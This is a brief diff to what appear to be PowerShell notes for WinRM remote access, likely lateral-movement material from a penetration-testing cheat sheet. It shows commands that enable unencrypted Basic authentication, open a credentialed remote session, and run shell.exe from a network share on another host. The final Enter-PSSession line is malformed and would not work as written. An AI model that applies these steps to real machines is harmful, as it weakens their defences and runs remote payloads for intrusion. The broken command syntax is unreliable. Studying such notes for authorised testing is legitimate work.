@@ -33,6 +33,7 @@ set-item .\allowunencrypted $true
 set-item  WSMan:\localhost\Service\Auth\Basic $true # For domain environment
 set-item  WSMan:\localhost\Service\AllowUnencrypted $true# For domain environment
 
+Test-NetConnection 192.168.10.142 -CommonTCPPort WINRM
 test-wsman -computername "WIN-S0V7KMTVLD2"
 New-PSSession -ComputerName 192.168.1.2 -Credential (Get-Credential)
 Enter-PSSession 2 cmd.exe /c \\192.168.1.4\sharename\shell.exe
